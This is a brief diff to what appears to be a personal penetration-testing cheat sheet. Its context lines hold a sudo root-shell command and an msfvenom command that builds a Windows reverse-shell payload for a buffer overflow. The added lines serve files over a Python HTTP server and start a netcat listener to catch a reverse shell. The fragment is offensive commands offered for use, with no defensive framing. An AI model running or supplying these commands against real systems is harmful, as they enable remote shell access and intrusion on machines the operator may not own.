@@ -29,5 +29,11 @@ $sudo -u root /bin/bash
 -buffer overflow payload-
 msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread -f c -a x86 –platform windows -b "\x00"
 
+-creating server http-
+python3 -m http.server <port>
+
+-listening reverse shell-
+nc -nvlp <port>
+
 
 
